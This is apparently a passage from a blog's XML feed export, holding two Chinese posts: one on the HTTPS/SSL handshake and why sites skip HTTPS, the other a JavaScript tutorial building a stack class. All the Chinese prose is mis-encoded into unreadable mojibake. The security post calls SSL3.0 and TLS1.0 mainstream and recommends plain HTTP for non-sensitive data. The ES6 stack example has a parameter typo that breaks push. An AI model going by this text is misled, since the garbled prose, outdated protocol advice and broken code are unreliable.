å¯†ä¹‹åŽï¼Œå¯èƒ½å¶å°”è¿˜ä¼šçœ‹è§é€šä¿¡å¤„åœ¨å®‰å…¨çŠ¶æ€çš„æç¤ºï¼Œå¯é‚£ä¹Ÿæ˜¯æœ‰é—®é¢˜çš„ã€‚å› ä¸º å°±ç®—åŠ å¯†é€šä¿¡ï¼Œä¹Ÿä¸èƒ½æŽ’é™¤æ­£åœ¨å’Œå·²ç»è¿‡ä¼ªè£…çš„å‡æœåŠ¡å™¨ä¿æŒé€šä¿¡ã€‚ å€¼å¾—ä¿¡èµ–çš„ç¬¬ä¸‰æ–¹æœºæž„ä»‹å…¥è®¤è¯ï¼Œæ‰èƒ½è®©å·²æ¤å…¥åœ¨æµè§ˆå™¨å†…çš„è®¤è¯æœºæž„é¢å¸ƒçš„å…¬å¼€å¯†é’¥å‘æŒ¥ä½œç”¨ï¼Œå¹¶å€Ÿæ­¤è¯æ˜ŽæœåŠ¡å™¨çš„çœŸå®žæ€§ã€‚ ä¸­çº§è®¤è¯æœºæž„çš„è¯ä¹¦å¯èƒ½ä¼šå˜æˆè‡ªè®¤è¯è¯ä¹¦å¤šæ•°æµè§ˆå™¨å†…é¢„å…ˆå·²æ¤å…¥å¤‡å—ä¿¡èµ–çš„è®¤è¯æœºæž„çš„è¯ä¹¦ï¼Œä½†ä¹Ÿæœ‰ä¸€å°éƒ¨åˆ†æµè§ˆå™¨ä¼šæ¤å…¥ä¸­çº§è®¤è¯æœºæž„çš„è¯ä¹¦ã€‚å¯¹äºŽä¸­çº§è®¤è¯æœºæž„é¢å‘çš„æœåŠ¡å™¨è¯ä¹¦ï¼ŒæŸäº›æµè§ˆå™¨ä¼šä»¥æ­£è§„çš„è¯ä¹¦æ¥å¯¹å¾…ï¼Œå¯æœ‰çš„æµè§ˆå™¨ä¼šå½“ä½œè‡ªç­¾åè¯ä¹¦ã€‚ HTTPS çš„å®‰å…¨é€šä¿¡æœºåˆ¶ HTTPS çš„é€šä¿¡æ­¥éª¤ å®¢æˆ·ç«¯é€šè¿‡å‘é€ Client Hello æŠ¥æ–‡å¼€å§‹ SSL é€šä¿¡ã€‚æŠ¥æ–‡ä¸­åŒ…å«äº†å®¢æˆ·ç«¯æ”¯æŒçš„ SSL çš„æŒ‡å®šç‰ˆæœ¬ã€åŠ å¯†ç»„ä»¶ï¼ˆCipher Suiteï¼‰åˆ—è¡¨ï¼ˆæ‰€æœ‰ä½¿ç”¨çš„åŠ å¯†ç®—æ³•åŠå¯†é’¥çš„é•¿åº¦ç­‰ï¼‰ æœåŠ¡å™¨å¯è¿›è¡Œ SSL é€šä¿¡æ—¶ï¼Œä¼šä»¥ Server Hello æŠ¥æ–‡ä½œä¸ºåº”ç­”ã€‚å’Œå®¢æˆ·ç«¯ä¸€æ ·ï¼Œåœ¨æŠ¥æ–‡ä¸­åŒ…å« SSL ç‰ˆæœ¬å’ŒåŠ å¯†ç»„ä»¶ã€‚æœåŠ¡å™¨çš„åŠ å¯†ç»„ä»¶å†…å®¹æ˜¯ä»ŽæŽ¥å—çš„å®¢æˆ·ç«¯åŠ å¯†ç»„ä»¶å†…ç­›é€‰å‡ºæ¥çš„ã€‚ ä¹‹åŽæœåŠ¡å™¨å‘é€ Certificate æŠ¥æ–‡ã€‚æŠ¥æ–‡ä¸­åŒ…å«å…¬å¼€å¯†é’¥è¯ä¹¦ã€‚ æœ€åŽæœåŠ¡å™¨å‘é€ Server Hello Done æŠ¥æ–‡é€šçŸ¥å®¢æˆ·ç«¯ï¼Œæœ€åˆé˜¶æ®µçš„ SSL æ¡æ‰‹åå•†éƒ¨åˆ†ç»“æŸã€‚ SSL ç¬¬ä¸€æ¬¡æ¡æ‰‹ç»“æŸä¹‹åŽï¼Œå®¢æˆ·ç«¯ä¼šä»¥ Client Key Exchange æŠ¥æ–‡ä½œä¸ºå›žåº”ã€‚æŠ¥æ–‡ä¸­åŒ…å«é€šä¿¡åŠ å¯†ä¸­ä½¿ç”¨çš„ä¸€ç§è¢«ç§°ä¸º Pre-master secret çš„éšæœºå¯†ç ä¸²ã€‚è¯¥æŠ¥æ–‡ä¸Žç”¨æ­¥éª¤3 ä¸­çš„å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚ æŽ¥ç€å®¢æˆ·ç«¯ç»§ç»­å‘é€ Change Cipher Spec æŠ¥æ–‡ã€‚è¯¥æŠ¥æ–‡æ±‡æç¤ºæœåŠ¡å™¨ï¼Œåœ¨æ­¤æŠ¥æ–‡ä¹‹åŽçš„é€šä¿¡ä¼šé‡‡ç”¨ Pre-master secret å¯†é’¥åŠ å¯†ã€‚ å®¢æˆ·ç«¯å‘é€ Finished æŠ¥æ–‡ã€‚è¯¥æŠ¥æ–‡åŒ…å«è¿žæŽ¥è‡³ä»Šå…¨éƒ¨æŠ¥æ–‡çš„ æ•´ä½“æ ¡éªŒå€¼ã€‚è¿™æ¬¡æ¡æ‰‹åå•†æ˜¯å¦èƒ½å¤ŸæˆåŠŸï¼Œè¦ä»¥æœåŠ¡å™¨æ˜¯å¦èƒ½å¤Ÿæ­£ç¡®è§£å¯†è¯¥æŠ¥æ–‡ä½œä¸ºåˆ¤å®šæ ‡å‡†ã€‚ æœåŠ¡å™¨åŒæ ·å‘é€ Change Cipher Spec æŠ¥æ–‡ã€‚ æœåŠ¡å™¨åŒæ ·å‘é€ Finished æŠ¥æ–‡ï¼› æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„ Finished æŠ¥æ–‡äº¤æ¢å®Œæ¯•åŽï¼Œ SSL è¿žæŽ¥å°±ç®—å»ºç«‹å®Œæˆäº†ã€‚å½“ç„¶ï¼Œé€šä¿¡ä¼šå—åˆ° SSL çš„ä¿æŠ¤ã€‚ä»Žæ­¤å¤„å¼€å§‹è¿›è¡Œåº”ç”¨å±‚çš„é€šä¿¡ï¼Œå³å‘é€ HTTP è¯·æ±‚ã€‚ åº”ç”¨å±‚åè®®é€šä¿¡ï¼Œå³å‘é€ HTTP å“åº”ã€‚ æœ€åŽç”±å®¢æˆ·ç«¯æ–­å¼€è¿žæŽ¥ã€‚æ–­å¼€è¿žæŽ¥æ—¶ï¼Œå‘é€ close_notify æŠ¥æ–‡ã€‚ åœ¨ä»¥ä¸Šæµç¨‹ä¸­ï¼Œåº”ç”¨å±‚å‘é€æ•°æ®æ—¶ä¼šé™„ä»¶ä¸€ç§å«åš MACï¼ˆMessage Authentication Codeï¼‰çš„æŠ¥æ–‡æ‘˜è¦ã€‚MAC èƒ½å¤ŸæŸ¥çŸ¥æŠ¥æ–‡æ˜¯å¦é­åˆ°ç¯¡æ”¹ï¼Œä»Žè€Œä¿è¯äº†æŠ¥æ–‡çš„å®Œæ•´æ€§ã€‚ ä¸‹é¢æ˜¯å¯¹æ•´ä¸ªæµç¨‹çš„å›¾è§£ã€‚å›¾ä¸­è¯´æ˜Žäº†ä»Žä»…é€‚ç”¨æœåŠ¡å™¨ç«¯çš„å…¬å¼€å¯†é’¥è¯ä¹¦ï¼ˆæœåŠ¡å™¨è¯ä¹¦ï¼‰å»ºç«‹æ•´ä¸ª HTTPS é€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ SSL å’Œ TLS HTTPS ä½¿ç”¨ SSL ï¼ˆSecure Socket Layerï¼‰å’Œ TLS ï¼ˆTransport Layer Securityï¼‰è¿™ä¸¤ä¸ªåè®®ã€‚ SSL æŠ€æœ¯æœ€åˆæ˜¯ç”±æµè§ˆå™¨å¼€å‘å•†ç½‘æ™¯é€šä¿¡å…¬å¸çŽ‡å…ˆå€¡å¯¼çš„ï¼Œå¼€å‘è¿‡ SSL3.0 ä¹‹å‰çš„ç‰ˆæœ¬ã€‚ç›®å‰ä¸»å¯¼æƒå·²è½¬ç§»åˆ° IETFï¼ˆInternetEngineering Task Forceï¼ŒInternet å·¥ç¨‹ä»»åŠ¡ç»„ï¼‰çš„æ‰‹ä¸­ã€‚ IETF ä»¥ SSL3.0 ä¸ºåŸºå‡†ï¼ŒåŽåˆåˆ¶å®šäº† TLS1.0ã€TLS1.1 å’ŒTLS1.2ã€‚TSL æ˜¯ä»¥ SSL ä¸ºåŽŸåž‹å¼€å‘çš„åè®®ï¼Œæœ‰æ—¶ä¼šç»Ÿä¸€ç§°è¯¥åè®®ä¸º SSLã€‚å½“å‰ä¸»æµçš„ç‰ˆæœ¬æ˜¯ SSL3.0 å’Œ TLS1.0ã€‚ ç”±äºŽ SSL1.0 åè®®åœ¨è®¾è®¡ä¹‹åˆè¢«å‘çŽ°å‡ºäº†é—®é¢˜ï¼Œå°±æ²¡æœ‰å®žé™…æŠ•å…¥ä½¿ç”¨ã€‚SSL2.0 ä¹Ÿè¢«å‘çŽ°å­˜åœ¨é—®é¢˜ï¼Œæ‰€ä»¥å¾ˆå¤šæµè§ˆå™¨ç›´æŽ¥åºŸé™¤äº†è¯¥åè®®ç‰ˆæœ¬ã€‚ SSL é€Ÿåº¦æ…¢å— HTTPS ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œé‚£å°±æ˜¯å½“ä½¿ç”¨ SSL æ—¶ï¼Œå®ƒçš„å¤„ç†é€Ÿåº¦ä¼šå˜æ…¢ã€‚ SSL çš„æ…¢åˆ†æˆä¸¤ç§ã€‚ä¸€ç§æ˜¯æŒ‡é€šä¿¡æ…¢ã€‚å¦ä¸€ç§æ˜¯æŒ‡ç”±äºŽå¤§é‡æ¶ˆè€—CPU ä»¥åŠå†…å­˜ç­‰èµ„æºï¼Œå¯¼è‡´å¤„ç†é€Ÿåº¦å˜æ…¢ã€‚ å’Œä½¿ç”¨ HTTP ç›¸æ¯”ï¼Œç½‘ç»œè´Ÿè½½å¯èƒ½ä¼šæ…¢2åˆ°100å€ã€‚é™¤åŽ»å’Œ TCP è¿žæŽ¥ã€å‘é€ HTTP è¯·æ±‚å“åº”ä»¥å¤–ï¼Œè¿˜å¿…é¡»è¿›è¡Œ SSL é€šä¿¡ï¼Œå› æ­¤æ•´ä½“ä¸Šå¤„ç†é€šä¿¡é‡ä¸å¯é¿å…ä¼šå¢žåŠ ã€‚ å¦ä¸€ç‚¹æ˜¯ SSL å¿…é¡»è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½éœ€è¦è¿›è¡ŒåŠ å¯†å’Œè§£å¯†çš„è¿ç®—å¤„ç†ã€‚å› æ­¤ä»Žç»“æžœä¸Šè®²ï¼Œæ¯”èµ· HTTP ä¼šæ›´å¤šåœ°æ¶ˆè€—æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯çš„ç¡¬ä»¶èµ„æºï¼Œå¯¼è‡´è´Ÿè½½å¢žå¼ºã€‚ é’ˆå¯¹é€Ÿåº¦å˜æ…¢è¿™ä¸€é—®é¢˜ï¼Œå¹¶æ²¡æœ‰æ ¹æœ¬æ€§çš„è§£å†³æ–¹æ¡ˆï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨SSL åŠ é€Ÿå™¨è¿™ç§ï¼ˆä¸“ç”¨æœåŠ¡å™¨ï¼‰ç¡¬ä»¶æ¥æ”¹å–„è¯¥é—®é¢˜ã€‚è¯¥ç¡¬ä»¶ä¸ºSSL é€šä¿¡ä¸“ç”¨ç¡¬ä»¶ï¼Œç›¸å¯¹è½¯ä»¶æ¥è®²ï¼Œèƒ½å¤Ÿæé«˜æ•°å€ SSL çš„è®¡ç®—é€Ÿåº¦ã€‚ä»…åœ¨ SSL å¤„ç†æ—¶å‘æŒ¥ SSL åŠ é€Ÿå™¨çš„åŠŸæ•ˆï¼Œä»¥åˆ†æ‹…è´Ÿè½½ã€‚ ä¸ºä»€ä¹ˆä¸ä¸€ç›´ä½¿ç”¨ HTTPSä¸­ä¸€ä¸ªåŽŸå› æ˜¯ï¼Œå› ä¸ºä¸Žçº¯æ–‡æœ¬é€šä¿¡ç›¸æ¯”ï¼ŒåŠ å¯†é€šä¿¡ä¼šæ¶ˆè€—æ›´å¤šçš„CPU åŠå†…å­˜èµ„æºã€‚å¦‚æžœæ¯æ¬¡é€šä¿¡éƒ½åŠ å¯†ï¼Œä¼šæ¶ˆè€—ç›¸å½“å¤šçš„èµ„æºï¼Œå¹³æ‘Šåˆ°ä¸€å°è®¡ç®—æœºä¸Šæ—¶ï¼Œèƒ½å¤Ÿå¤„ç†çš„è¯·æ±‚æ•°é‡å¿…å®šä¹Ÿä¼šéšä¹‹å‡å°‘ã€‚ å› æ­¤ï¼Œå¦‚æžœæ˜¯éžæ•æ„Ÿä¿¡æ¯åˆ™ä½¿ç”¨ HTTP é€šä¿¡ï¼Œåªæœ‰åœ¨åŒ…å«ä¸ªäººä¿¡æ¯ç­‰æ•æ„Ÿæ•°æ®æ—¶ï¼Œæ‰åˆ©ç”¨ HTTPS åŠ å¯†é€šä¿¡ã€‚ ç‰¹åˆ«æ˜¯æ¯å½“é‚£äº›è®¿é—®é‡è¾ƒå¤šçš„ Web ç½‘ç«™åœ¨è¿›è¡ŒåŠ å¯†å¤„ç†æ—¶ï¼Œå®ƒä»¬æ‰€æ‰¿æ‹…ç€çš„è´Ÿè½½ä¸å®¹å°è§‘ã€‚åœ¨è¿›è¡ŒåŠ å¯†å¤„ç†æ—¶ï¼Œå¹¶éžå¯¹æ‰€æœ‰å†…å®¹éƒ½è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œè€Œæ˜¯ä»…åœ¨é‚£äº›éœ€è¦ä¿¡æ¯éšè—æ—¶æ‰ä¼šåŠ å¯†ï¼Œä»¥èŠ‚çº¦èµ„æºã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œæƒ³è¦èŠ‚çº¦è´­ä¹°è¯ä¹¦çš„å¼€é”€ä¹Ÿæ˜¯åŽŸå› ä¹‹ä¸€ã€‚ è¦è¿›è¡Œ HTTPS é€šä¿¡ï¼Œè¯ä¹¦æ˜¯å¿…ä¸å¯å°‘çš„ã€‚è€Œä½¿ç”¨çš„è¯ä¹¦å¿…é¡»å‘è®¤è¯æœºæž„ï¼ˆCAï¼‰è´­ä¹°ã€‚è¯ä¹¦ä»·æ ¼å¯èƒ½ä¼šæ ¹æ®ä¸åŒçš„è®¤è¯æœºæž„ç•¥æœ‰ä¸åŒã€‚é€šå¸¸ï¼Œä¸€å¹´çš„æŽˆæƒéœ€è¦æ•°ä¸‡æ—¥å…ƒï¼ˆçŽ°åœ¨ä¸€ä¸‡æ—¥å…ƒå¤§çº¦æŠ˜åˆ 600äººæ°‘å¸ï¼‰ã€‚é‚£äº›è´­ä¹°è¯ä¹¦å¹¶ä¸åˆç®—çš„æœåŠ¡ä»¥åŠä¸€äº›ä¸ªäººç½‘ç«™ï¼Œå¯èƒ½åªä¼šé€‰æ‹©é‡‡ç”¨ HTTP çš„é€šä¿¡æ–¹å¼ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://book.douban.com/subject/25863515/]]></content>
      <categories>
        <category>http</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬ä¸‰ç« ï¼‰â€”â€” æ ˆ]]></title>
    <url>%2F2018-08-25-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part3.html</url>
    <content type="text"><![CDATA[æœ‰ä¸¤ç§ç»“æž„ç±»ä¼¼äºŽæ•°ç»„ï¼Œä½†åœ¨æ·»åŠ å’Œåˆ é™¤å…ƒç´ æ—¶æ›´åŠ å¯æŽ§ï¼Œå®ƒä»¬å°±æ˜¯æ ˆå’Œé˜Ÿåˆ—ã€‚ ç¬¬ä¸‰ç«  æ ˆæ ˆæ•°æ®ç»“æž„æ ˆæ˜¯ä¸€ç§éµå¾ªåŽè¿›å…ˆå‡ºï¼ˆLIFOï¼‰åŽŸåˆ™çš„æœ‰åºé›†åˆã€‚æ–°æ·»åŠ çš„æˆ–å¾…åˆ é™¤çš„å…ƒç´ éƒ½ä¿å­˜åœ¨æ ˆçš„åŒä¸€ç«¯ï¼Œç§°ä¸ºæ ˆé¡¶ï¼Œå¦ä¸€ç«¯å°±å«åšæ ˆåº•ã€‚åœ¨æ ˆé‡Œï¼Œ æ–°å…ƒç´ éƒ½é è¿‘æ ˆé¡¶ï¼Œæ—§å…ƒç´ éƒ½æŽ¥è¿‘æ ˆåº•ã€‚ æ ˆä¹Ÿè¢«ç”¨åœ¨ç¼–ç¨‹è¯­è¨€çš„ç¼–è¯‘å™¨å’Œå†…å­˜ä¸­ä¿å­˜å˜é‡ã€æ–¹æ³•è°ƒç”¨ç­‰ã€‚ åˆ›å»ºæ ˆ å…ˆå£°æ˜Žè¿™ä¸ªç±» 123function Stack()&#123; // å„ç§å±žæ€§å’Œæ–¹æ³•çš„å£°æ˜Ž&#125; é€‰æ‹©æ•°ç»„è¿™ç§æ•°æ®ç»“æž„æ¥ä¿å­˜æ ˆé‡Œçš„å…ƒç´  1let items = []; ä¸ºæ ˆå£°æ˜Žä¸€äº›æ–¹æ³• pushï¼ˆelementï¼ˆsï¼‰ï¼‰ï¼š æ·»åŠ ä¸€ä¸ªï¼ˆæˆ–è€…å‡ ä¸ªï¼‰æ–°å…ƒç´ åˆ°æ ˆé¡¶ popï¼ˆï¼‰ï¼šç§»é™¤æ ˆé¡¶çš„å…ƒç´ ï¼ŒåŒæ—¶è¿”å›žè¢«ç§»é™¤çš„å…ƒç´  peekï¼ˆï¼‰ï¼šè¿”å›žæ ˆé¡¶çš„å…ƒç´ ï¼Œä¸ä¼šå¯¹æ ˆåšä»»ä½•ä¿®æ”¹ï¼ˆè¿™ä¸ªæ–¹æ³•ä¸ä¼šç§»é™¤æ ˆé¡¶çš„å…ƒç´ ï¼Œä»…ä»…è¿”å›žå®ƒï¼‰ isEmptyï¼ˆï¼‰ï¼šå¦‚æžœæ ˆé‡Œæ²¡æœ‰ä»»ä½•å…ƒç´ çš„å°±è¿”å›žtrueï¼Œå¦åˆ™å°±è¿”å›žfalse. clearï¼ˆï¼‰ï¼šç§»é™¤æ ˆé‡Œçš„æ‰€æœ‰å…ƒç´  sizeï¼ˆï¼‰ï¼šè¿”å›žæ ˆé‡Œçš„å…ƒç´ ä¸ªæ•°ï¼Œè¿™ä¸ªæ–¹æ³•å’Œæ•°ç»„çš„lengthå±žæ€§å¾ˆç±»ä¼¼ã€‚ å‘æ ˆæ·»åŠ å…ƒç´ æˆ‘ä»¬è¦å®žçŽ°çš„ç¬¬ä¸€ä¸ªæ–¹æ³•æ˜¯ push,è¿™ä¸ªæ–¹æ³•è´Ÿè´£å‘æ ˆé‡Œæ·»åŠ æ–°å…ƒç´ ï¼Œè¯¥æ–¹æ³•åªæ·»åŠ å…ƒç´ åˆ°æ ˆé¡¶ï¼Œä¹Ÿå°±æ˜¯æ ˆçš„æœ«å°¾ã€‚ 123this.push = function(element)&#123; return items.push(element);&#125; åªèƒ½ç”¨ push å’Œ pop æ–¹æ³•æ·»åŠ å’Œåˆ é™¤æ ˆä¸­å…ƒç´ ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬çš„æ ˆå°±è‡ªç„¶éµä»Žäº† LIFO åŽŸåˆ™ã€‚ å‘æ ˆç§»é™¤å…ƒç´  æˆ‘ä»¬è¦å®žçŽ°çš„ç¬¬ä¸€ä¸ªæ–¹æ³•æ˜¯ pop,è¿™ä¸ªæ–¹æ³•ä¸»è¦ç”¨æ¥ç§»é™¤æ ˆé‡Œçš„å…ƒç´ ã€‚æ ˆéµä»Ž LIFO åŽŸåˆ™ï¼Œå› æ­¤ç§»å‡ºçš„æ˜¯æœ€åŽæ·»åŠ è¿›åŽ»çš„å…ƒç´ ã€‚æ ˆçš„ pop æ–¹æ³•å¯ä»¥è¿™ä¹ˆå†™ 123this.pop = function()&#123; return items.pop();&#125; åªèƒ½ç”¨ push å’Œ pop æ–¹æ³•æ·»åŠ å’Œåˆ é™¤æ ˆä¸­å…ƒç´ ï¼Œè¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬çš„æ ˆå°±è‡ªç„¶éµä»Žäº† LIFO åŽŸåˆ™ã€‚ æŸ¥çœ‹æ ˆé¡¶å…ƒç´ çŽ°åœ¨ä¸ºç±»å®žçŽ°ä¸€äº›é¢å¤–çš„è¾…åŠ©æ–¹æ³•ï¼Œå¦‚æžœæƒ³çŸ¥é“æ ˆé‡Œæœ€åŽæ·»åŠ çš„å…ƒç´ æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥ç”¨ peek æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å°†è¿”å›žæ ˆé¡¶çš„å…ƒç´ ã€‚ 123this.peek = function()&#123; return items[items.length-1];&#125; å› ä¸ºç±»å†…éƒ¨æ˜¯ç”¨æ•°ç»„ä¿å­˜å…ƒç´ çš„ï¼Œæ‰€ä»¥è®¿é—®æ•°ç»„çš„æœ€åŽä¸€ä¸ªå…ƒç´ å¯ä»¥ç”¨ length - 1 æ£€æŸ¥æ ˆæ˜¯å¦ä¸ºç©º isEmpty ,å¦‚æžœæ ˆä¸ºç©ºçš„è¯å°±è¿”å›žtrueï¼Œå¦åˆ™å°±è¿”å›žfalse 123this.isEmpty = function()&#123; return items.length == 0;&#125; ç±»ä¼¼äºŽæ•°ç»„çš„ length å±žæ€§ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å®žçŽ°æ ˆçš„ length,å¯¹äºŽé›†åˆï¼Œæœ€å¥½ç”¨ size ä»£æ›¿ lengthã€‚å› ä¸ºæ ˆçš„å†…éƒ¨ä½¿ç”¨æ•°ç»„ä¿å­˜å…ƒç´ ï¼Œæ‰€ä»¥èƒ½ç®€å•åœ°è¿”å›žæ ˆçš„é•¿åº¦ã€‚ 123this.size = function()&#123; return items.length;&#125; æ¸…ç©ºå’Œæ‰“å°æ ˆå…ƒç´ å®žçŽ° clear æ–¹æ³•ã€‚clear æ–¹æ³•ç”¨æ¥ç§»é™¤æ ˆé‡Œæ‰€æœ‰çš„å…ƒç´ ï¼ŒæŠŠæ ˆæ¸…ç©ºã€‚å®žçŽ°è¿™ä¸ªæ–¹æ³•æœ€ç®€å•çš„æ–¹å¼æ˜¯ 1234this.clear = function()&#123; items = []; return null;&#125; æ‰“å°å‡ºæ¥æ ˆé‡Œé¢çš„å†…å®¹ï¼Œé€šè¿‡å®žçŽ°è¾…åŠ©æ–¹æ³• print æ¥å®žçŽ°ã€‚ 123this.print = function()&#123; console.log(items.toString());&#125; å®žä¾‹12345678910111213141516171819202122232425262728293031323334function Stack()&#123; let items = []; this.push = function(element)&#123; return items.push(element); &#125; this.pop = function()&#123; return items.pop(); &#125; this.peek = function()&#123; return items[items.length-1]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(items.toString()); &#125; &#125;let stack = new Stack();console.log(stack.isEmpty()); // true åˆ¤æ–­æ˜¯å¦ä¸ºç©ºstack.push(5); // å¾€æ ˆé‡Œæ·»åŠ å…ƒç´  5stack.push(8); // å¾€æ ˆé‡Œæ·»åŠ å…ƒç´  8console.log(stack.peek()); // æŸ¥çœ‹æœ€åŽä¸€ä¸ªå…ƒç´  8stack.push(11); // å¾€æ ˆé‡Œæ·»åŠ å…ƒç´  11console.log(stack.size()); // 3 è¾“å‡ºæ ˆçš„å…ƒç´ ä¸ªæ•°console.log(stack.isEmpty()); // false åˆ¤æ–­æ˜¯å¦ä¸ºç©ºstack.push(15); // å¾€æ ˆé‡Œæ·»åŠ å…ƒç´  15stack.print(); // 5,8,11,15 è¾“å‡ºæ ˆé‡Œçš„å…ƒç´  ä¸‹é¢æ˜¯æµç¨‹å›¾ ECMAScript6 å’Œ Stack ç±»åˆ›å»ºäº†ä¸€ä¸ªå¯ä»¥å½“åšç±»æ¥ä½¿ç”¨çš„ Stack å‡½æ•°ã€‚JavaScript å‡½æ•°éƒ½æœ‰æž„é€ å‡½æ•°ï¼Œå¯ä»¥ç”¨æ¥æ¨¡æ‹Ÿç±»çš„è¡Œä¸ºã€‚æˆ‘ä»¬å£°æ˜Žä¸€ä¸ªç§æœ‰çš„ itemså˜é‡ï¼Œå®ƒåªèƒ½è¢« Stack å‡½æ•°/ç±»è®¿é—®ã€‚ç„¶è€Œï¼Œè¿™ä¸ªæ–¹æ³•ä¸ºæ¯ä¸ªç±»çš„å®žä¾‹éƒ½åˆ›å»ºäº†ä¸€ä¸ª items å˜é‡çš„å‰¯æœ¬ã€‚å› æ­¤å¦‚æžœè¦åˆ›å»ºå¤šä¸ª Stackå®žä¾‹ï¼Œå°±ä¸å¤ªé€‚åˆã€‚æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨ ES6è¯­æ³•æ¥å£°æ˜Ž Stack ç±»ã€‚ ç”¨ ES6 å£°æ˜Ž Stack ç±»123456789class Stack&#123; constructor()&#123; this.items = []; // &#123;1&#125; &#125; push(elememt)&#123; this.items.push(element); &#125; // å…¶ä»–æ–¹æ³•&#125; åªæ˜¯ç”¨ ES6 çš„ç®€åŒ–è¯­æ³•æŠŠ Stack å‡½æ•°è½¬æ¢æˆ Stack ç±»ã€‚è¿™ç§æ–¹æ³•ä¸èƒ½åƒå…¶ä»–è¯­è¨€ï¼ˆJavaã€C++ã€C#ï¼‰ä¸€æ ·ç›´æŽ¥åœ¨ç±»é‡Œé¢å£°æ˜Žå˜é‡ï¼Œåªèƒ½åœ¨ç±»çš„æž„é€ å‡½æ•° constructor é‡Œå£°æ˜Žï¼Œåœ¨ç±»çš„å…¶ä»–å‡½æ•°é‡Œç”¨ this.nameofVariable å°±å¯ä»¥å¼•ç”¨è¿™ä¸ªå˜é‡ã€‚ å°½ç®¡ä»£ç çœ‹èµ·æ¥æ›´åŠ ç®€æ´ã€æ›´æ¼‚äº®ï¼Œå˜é‡ items å´æ˜¯å…¬å…±çš„ã€‚ES6 ç±»æ˜¯åŸºäºŽåŽŸåž‹çš„ã€‚è™½ç„¶åŸºäºŽåŽŸåž‹çš„ç±»æ¯”åŸºäºŽå‡½æ•°çš„ç±»æ›´èŠ‚çœå†…å­˜ï¼Œä¹Ÿæ›´é€‚åˆåˆ›å»ºå¤šä¸ªå®žä¾‹ï¼Œå´ä¸èƒ½å¤Ÿå£°æ˜Žç§æœ‰å±žæ€§ï¼ˆå˜é‡ï¼‰æˆ–æ–¹æ³•ã€‚è€Œä¸”ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ› Stack ç±»çš„ç”¨æˆ·åªèƒ½è®¿é—®æš´éœ²ç»™ç±»çš„æ–¹æ³•ã€‚å¦åˆ™ï¼Œå°±æœ‰å¯èƒ½ä»Žæ ˆçš„ä¸­é—´ç§»é™¤å…ƒç´ ï¼ˆå› ä¸ºæˆ‘ä»¬ç”¨æ•°ç»„æ¥å­˜å‚¨å…¶å€¼ï¼‰ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬å¸Œæœ›çœ‹åˆ°çš„ã€‚ ç”¨ES6çš„é™å®šä½œç”¨åŸŸ Symbol å®žçŽ°ç±»ES6 æ–°å¢žäº†ä¸€ç§å«åš Symbol çš„åŸºæœ¬ç±»åž‹ï¼Œå®ƒæ˜¯ä¸å¯å˜çš„ï¼Œå¯ä»¥ç”¨ä½œå¯¹è±¡çš„å±žæ€§ã€‚ 123456789101112131415161718192021222324252627let _items = Symbol(); // å£°æ˜Žäº† Symbol ç±»åž‹çš„å˜é‡class Stack&#123; constructor()&#123; this[_items] = [] // è¦è®¿é—® _items,åªéœ€æŠŠæ‰€æœ‰çš„ this.itemséƒ½æ¢æˆ this.[_items] &#125; push(element)&#123; return this[_items].push(element); &#125; pop ()&#123; return this[_items].pop(); &#125; peek ()&#123; return this[_items][this[_items].length-1]; &#125; isEmpty ()&#123; return this[_items].length == 0; &#125; size ()&#123; return this[_items].length; &#125; clear ()&#123; this[_items] = []; &#125; print ()&#123; console.log(this[_items].toString()); &#125;&#125; è¿™ç§æ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ªå‡çš„ç§æœ‰å±žæ€§ï¼Œå› ä¸ºES6 æ–°å¢žçš„Object.getOwnPropertySymbols æ–¹æ³•èƒ½å¤Ÿå–åˆ°ç±»é‡Œé¢å£°æ˜Žçš„æ‰€æœ‰ Symbols å±žæ€§ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç ´å Stack ç±»çš„ä¾‹å­ 123456789let stack = new Stack();stack.push(5);stack.push(8);let objectSymbols = Object.getOwnPropertySymbols(stack);console.log(objectSymbols.length); // 1console.log(objectSymbols); // [Symbol()]console.log(objectSymbols[0]); // Symbol()stack[objectSymbols[0]].push(1); stack.print(); // 5,8,1 å¾ˆæ˜Žæ˜¾å¯ä»¥é€šè¿‡è®¿é—® stack[objectSymbol[0]] å¾—åˆ° _itemsã€‚å¹¶ä¸” _itemså±žæ€§æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥è¿›è¡Œä»»æ„çš„æ•°ç»„æ“ä½œï¼Œæ¯”å¦‚ä»Žä¸­é—´åˆ é™¤æˆ–è€…æ˜¯æ·»åŠ å…ƒç´ ã€‚æˆ‘ä»¬æ“ä½œçš„æ˜¯æ ˆï¼Œä¸åº”è¯¥æœ‰è¿™ç§è¡Œä¸ºå‡ºçŽ°ã€‚ ç”¨ES6ç±»çš„ WeakMap 